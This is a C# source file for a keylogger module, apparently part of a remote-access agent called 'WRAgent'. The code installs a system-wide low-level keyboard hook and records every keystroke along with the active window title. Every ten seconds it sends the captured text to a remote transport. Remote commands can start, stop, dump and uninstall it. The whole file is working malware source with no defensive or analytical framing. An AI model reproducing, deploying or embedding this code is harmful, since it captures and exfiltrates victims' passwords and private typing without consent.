using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json.Nodes;
using System.Windows.Forms;

namespace WRAgent
{
    /// <summary>
    /// Low-level keyboard hook. Must be installed from the UI thread —
    /// the hook callback needs a pumping message loop (Application.Run).
    /// </summary>
    internal static class KeylogModule
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern short GetKeyState(int vk);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] state);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint code, uint mapType);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int ToUnicode(uint vk, uint sc, byte[] state, StringBuilder buf, int count, uint flags);

        // ------------------------------------------------------------------
        private static HookProc _proc;          // keep delegate alive
        private static IntPtr _hook = IntPtr.Zero;
        private static Form _host;
        private static System.Threading.Timer _flush;
        private static volatile bool _enabled;
        private static readonly StringBuilder Buffer = new();
        private static readonly object Gate = new();
        private static string _lastTitle = "";

        // ------------------------------------------------------------------
        public static void Attach(Form host) => _host = host;

        public static void Install(Form host)
        {
            if (_hook != IntPtr.Zero) return;
            _host ??= host;
            _proc = Callback;

            var mod = GetModuleHandle(null);
            _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, mod, 0);
            if (_hook == IntPtr.Zero)
            {
                Log.W("keylog: SetWindowsHookEx failed " + Marshal.GetLastWin32Error());
                return;
            }

            _flush ??= new System.Threading.Timer(_ => Flush(), null,
                TimeSpan.FromSeconds(10), TimeSpan.FromSeconds(10));
            _enabled = true;
            Log.W("keylog: hook installed");
        }

        public static void Uninstall()
        {
            _enabled = false;
            if (_hook == IntPtr.Zero) return;
            try { UnhookWindowsHookEx(_hook); } catch { }
            _hook = IntPtr.Zero;
            Log.W("keylog: hook removed");
        }

        // ------------------------------------------------------------------
        private static IntPtr Callback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && _enabled)
                {
                    var kind = wParam.ToInt32();
                    if (kind == WM_KEYDOWN || kind == WM_SYSKEYDOWN)
                    {
                        var info = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

                        // Ctrl+V style bulk injection check — skip our own sends
                        var title = ForegroundTitle();
                        if (!string.IsNullOrEmpty(title) && title != _lastTitle)
                        {
                            _lastTitle = title;
                            Append($"\n[{title}]\n");
                        }
                        Append(Translate(info.vkCode));
                    }
                }
            }
            catch { /* never break the input chain */ }
            return CallNextHookEx(_hook, nCode, wParam, lParam);
        }

        private static void Append(string text)
        {
            if (string.IsNullOrEmpty(text)) return;
            lock (Gate) Buffer.Append(text);
        }

        private static void Flush()
        {
            string chunk;
            lock (Gate)
            {
                if (Buffer.Length == 0) return;
                chunk = Buffer.ToString();
                Buffer.Clear();
            }
            if (chunk.Length > 16000) chunk = chunk.Substring(chunk.Length - 16000);
            try { Transport.I.EmitAsync("keylog", chunk).GetAwaiter().GetResult(); } catch { }
        }

        // ------------------------------------------------------------------
        public static JsonObject Run(JsonObject args)
        {
            var action = Util.Str(args, "action", "start").ToLowerInvariant();
            switch (action)
            {
                case "start":
                    _enabled = true;
                    if (_hook == IntPtr.Zero)
                    {
                        var f = _host;
                        if (f != null) f.BeginInvoke(new Action(() => Install(f)));
                    }
                    return new JsonObject { ["ok"] = true, ["stdout"] = "keylog on" };

                case "stop":
                    _enabled = false;
                    Flush();
                    return new JsonObject { ["ok"] = true, ["stdout"] = "keylog off" };

                case "dump":
                {
                    string text;
                    lock (Gate)
                    {
                        text = Buffer.ToString();
                        Buffer.Clear();
                    }
                    return new JsonObject { ["ok"] = true, ["stdout"] = text };
                }

                case "clear":
                    lock (Gate) Buffer.Clear();
                    return new JsonObject { ["ok"] = true, ["stdout"] = "buffer cleared" };

                case "uninstall":
                    var form = _host;
                    if (form != null) form.BeginInvoke(new Action(Uninstall));
                    return new JsonObject { ["ok"] = true, ["stdout"] = "hook removed" };

                default:
                    return new JsonObject { ["ok"] = false, ["error"] = "unknown action" };
            }
        }

        // ------------------------------------------------------------------
        private static string ForegroundTitle()
        {
            var h = GetForegroundWindow();
            if (h == IntPtr.Zero) return "";
            var sb = new StringBuilder(256);
            GetWindowText(h, sb, sb.Capacity);
            return sb.ToString();
        }

        private static string Translate(uint vk)
        {
            var ctrl = (GetKeyState(0x11) & 0x8000) != 0;
            var alt = (GetKeyState(0x12) & 0x8000) != 0;

            if (ctrl && vk >= 0x41 && vk <= 0x5A) return $"[CTRL+{(char)vk}]";
            if (alt && vk >= 0x41 && vk <= 0x5A) return $"[ALT+{(char)vk}]";

            switch (vk)
            {
                case 0x08: return "[BKSP]";
                case 0x09: return "[TAB]";
                case 0x0D: return "\n";
                case 0x10: case 0xA0: case 0xA1: return "[SHIFT]";
                case 0x11: case 0xA2: case 0xA3: return "[CTRL]";
                case 0x12: case 0xA4: case 0xA5: return "[ALT]";
                case 0x13: return "[PAUSE]";
                case 0x14: return "[CAPS]";
                case 0x1B: return "[ESC]";
                case 0x20: return " ";
                case 0x21: return "[PGUP]";
                case 0x22: return "[PGDN]";
                case 0x23: return "[END]";
                case 0x24: return "[HOME]";
                case 0x25: return "[LEFT]";
                case 0x26: return "[UP]";
                case 0x27: return "[RIGHT]";
                case 0x28: return "[DOWN]";
                case 0x2C: return "[PRTSC]";
                case 0x2D: return "[INS]";
                case 0x2E: return "[DEL]";
                case 0x5B: case 0x5C: return "[WIN]";
                case 0x5D: return "[MENU]";
                case 0x90: return "[NUMLK]";
                case 0x91: return "[SCRLK]";
            }

            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + (vk - 0x60))).ToString();
            if (vk >= 0x70 && vk <= 0x7B) return $"[F{vk - 0x6F}]";

            try
            {
                var state = new byte[256];
                if (!GetKeyboardState(state)) return "";
                var sb = new StringBuilder(8);
                var sc = MapVirtualKey(vk, 0);
                var n = ToUnicode(vk, sc, state, sb, sb.Capacity, 0);
                if (n > 0) return sb.ToString(0, n);
            }
            catch { }
            return "";
        }
    }
}
